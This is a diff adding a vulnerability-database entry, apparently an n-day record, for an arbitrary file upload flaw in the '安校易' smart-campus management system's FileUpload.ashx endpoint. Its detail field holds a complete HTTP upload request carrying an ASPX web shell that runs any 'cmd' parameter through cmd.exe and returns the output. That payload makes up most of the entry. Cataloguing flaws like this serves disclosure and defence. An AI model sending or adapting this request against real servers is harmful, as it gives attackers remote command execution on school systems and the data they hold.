@@ -1,0 +1,16 @@
+vendor = "安校易"
+name = "智慧校园安校易管理系统 FileUpload.ashx 任意文件上传漏洞"
+type = "任意文件上传"
+path = "/FileUpload.ashx"
+version = ""
+detail = """POST /FileUpload.ashx HTTP/1.1 Host: target Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="shell.aspx"
+<%@Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start("cmd","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%>
+------Boundary--"""
+fix = "联系厂商获取安全版本"
+date = 20260501
+label = "nday"
+cve = "TVD-2026-10809"
+verifier = "AdySec"
